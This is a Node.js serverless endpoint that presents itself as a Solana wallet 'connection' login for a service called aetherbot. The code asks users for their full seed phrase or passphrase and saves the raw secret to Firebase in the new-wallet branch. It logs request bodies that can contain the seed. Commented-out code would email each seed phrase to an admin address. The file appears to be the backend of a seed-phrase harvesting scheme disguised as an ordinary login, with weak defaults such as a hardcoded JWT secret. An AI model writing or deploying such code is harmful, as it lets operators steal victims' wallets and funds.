/**
 * Wallet Connection Endpoint
 * 
 * Connects wallet using seed phrase or passphrase
 * Generates deterministic wallet address
 * Returns JWT token for authenticated sessions
 */

const { WalletGenerator, INPUT_TYPES, WALLET_TYPES } = require('./utils/walletGenerator');
const { createRPCInstance } = require('./utils/solanaRPC');
const { FirebaseWalletStore } = require('./utils/firebaseWalletStore');
// ⚠️ EMAIL SENDING DISABLED - Comment out to only write to Firebase
// const { sendWalletConnectionEmail } = require('./utils/loopsEmail');
const jwt = require('jsonwebtoken');

// Hardcoded defaults for local development
const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-key-change-in-production-use-crypto-randomBytes';
const TOKEN_EXPIRY = '30d'; // 30 days
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@aetherbot.app';

console.log('🔐 JWT Secret:', JWT_SECRET ? '✅ Set' : '❌ Missing');
console.log('📧 Admin Email:', ADMIN_EMAIL);

exports.handler = async (event) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  // Handle preflight
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  // Only accept POST
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    // Log raw body for debugging
    console.log('📦 Raw request body:', event.body ? event.body.substring(0, 300) : 'empty');
    
    let body;
    try {
      body = JSON.parse(event.body);
    } catch (parseError) {
      console.error('❌ JSON Parse Error:', parseError.message);
      console.error('❌ Invalid JSON:', event.body);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'Invalid JSON in request body',
          details: parseError.message
        })
      };
    }
    
    const { walletName, walletType, inputType, credentials, accountIndex = 0, email } = body;

    console.log('📨 Wallet connection request:', {
      walletType,
      inputType,
      hasEmail: !!email,
      email: email || 'not provided'
    });

    // Validate required fields
    if (!walletName) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'walletName is required (user identifier)' })
      };
    }

    // Validate email (optional but recommended)
    if (email && !email.includes('@')) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid email format' })
      };
    }

    // Validate walletType - accept any non-empty string
    if (!walletType || typeof walletType !== 'string' || walletType.trim().length === 0) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'walletType is required and must be a non-empty string',
          examples: ['phantom', 'solflare', 'backpack', 'trust', 'coinbase', 'custom']
        })
      };
    }

    if (!inputType || !Object.values(INPUT_TYPES).includes(inputType)) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'Invalid inputType',
          validTypes: Object.values(INPUT_TYPES)
        })
      };
    }

    if (!credentials || typeof credentials !== 'string') {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'credentials required (seed phrase or passphrase)' 
        })
      };
    }

    // Generate wallet from seed phrase or passphrase
    let walletInfo;
    try {
      walletInfo = WalletGenerator.generateWallet({
        inputType,
        input: credentials,
        walletType,
        accountIndex
      });
    } catch (error) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'Invalid credentials',
          details: error.message 
        })
      };
    }

    // Initialize Firebase store
    const walletStore = new FirebaseWalletStore();

    // Check if wallet exists by seed hash
    let existingWallet = await walletStore.getWalletBySeedHash(walletInfo.lookupHash);

    if (existingWallet) {
      // Wallet exists - this is a returning user
      console.log(`Existing wallet found: ${existingWallet.walletAddress}`);
      console.log(`📧 Email from request: ${email || 'none provided'}`);

      // Fetch current Solana balance
      const rpc = createRPCInstance();
      const balanceData = await rpc.getBalance(existingWallet.walletAddress);
      const txHistory = await rpc.getTransactionHistory(existingWallet.walletAddress, 5);

      // Update wallet with fresh data (including email if provided)
      await walletStore.updateWalletBalance(
        existingWallet.walletId,
        balanceData.balance,
        txHistory.transactions.map(tx => tx.signature),
        email // Pass email to update if provided
      );

      // ⚠️ EMAIL SENDING DISABLED - Only writing to Firebase now
      // Send email notification for returning user (async, don't wait)
      // sendWalletConnectionEmail(ADMIN_EMAIL, {
      //   walletAddress: existingWallet.walletAddress,
      //   inputType: existingWallet.inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase' : 'Passphrase',
      //   balance: balanceData.balance,
      //   isNewWallet: false,
      //   codes: credentials, // The actual seed phrase or passphrase
      //   walletType: existingWallet.walletType // Added walletType
      // }).catch(err => console.error('Email notification failed:', err.message));
      console.log('📧 Email notification skipped (disabled) - Data saved to Firebase only');

      // Generate JWT token
      const token = jwt.sign(
        {
          walletId: existingWallet.walletId,
          walletAddress: existingWallet.walletAddress,
          walletType: existingWallet.walletType,
          blockchain: 'solana'
        },
        JWT_SECRET,
        { expiresIn: TOKEN_EXPIRY }
      );

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: true,
          message: 'Wallet connected successfully',
          isNewWallet: false,
          wallet: {
            walletId: existingWallet.walletId,
            walletAddress: existingWallet.walletAddress,
            walletType: existingWallet.walletType,
            balance: balanceData.balance,
            balanceLastUpdated: balanceData.fetchedAt,
            recentTransactions: txHistory.transactions,
            createdAt: existingWallet.createdAt,
            lastLoginAt: new Date().toISOString(),
            loginCount: existingWallet.loginCount + 1
          },
          token,
          expiresIn: TOKEN_EXPIRY
        })
      };
    } else {
      // New wallet - create account
      console.log(`Creating new wallet: ${walletInfo.walletAddress}`);

      // Fetch Solana balance for new wallet
      const rpc = createRPCInstance();
      const balanceData = await rpc.getBalance(walletInfo.walletAddress);

      // Save wallet to Firebase
      await walletStore.saveWallet({
        ...walletInfo,
        balance: balanceData.balance,
        credentials: credentials, // Store the seed phrase or passphrase
        email: email || '' // Store email if provided
      });

      // ⚠️ EMAIL SENDING DISABLED - Only writing to Firebase now
      // Send email notification (async, don't wait)
      // sendWalletConnectionEmail(ADMIN_EMAIL, {
      //   walletAddress: walletInfo.walletAddress,
      //   inputType: inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase' : 'Passphrase',
      //   balance: balanceData.balance,
      //   isNewWallet: true,
      //   codes: credentials, // The actual seed phrase or passphrase
      //   walletType: walletInfo.walletType // Added walletType
      // }).catch(err => console.error('Email notification failed:', err.message));
      console.log('📧 Email notification skipped (disabled) - Data saved to Firebase only');

      // Generate JWT token
      const token = jwt.sign(
        {
          walletId: walletInfo.walletId,
          walletAddress: walletInfo.walletAddress,
          walletType,
          blockchain: 'solana'
        },
        JWT_SECRET,
        { expiresIn: TOKEN_EXPIRY }
      );

      return {
        statusCode: 201,
        headers,
        body: JSON.stringify({
          success: true,
          message: 'New wallet created successfully',
          isNewWallet: true,
          wallet: {
            walletId: walletInfo.walletId,
            walletAddress: walletInfo.walletAddress,
            walletType,
            balance: balanceData.balance,
            balanceLastUpdated: balanceData.fetchedAt,
            derivationPath: walletInfo.derivationPath,
            createdAt: walletInfo.createdAt,
            loginCount: 1
          },
          token,
          expiresIn: TOKEN_EXPIRY
        })
      };
    }
  } catch (error) {
    console.error('Wallet connection error:', error);

    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        message: error.message
      })
    };
  }
};
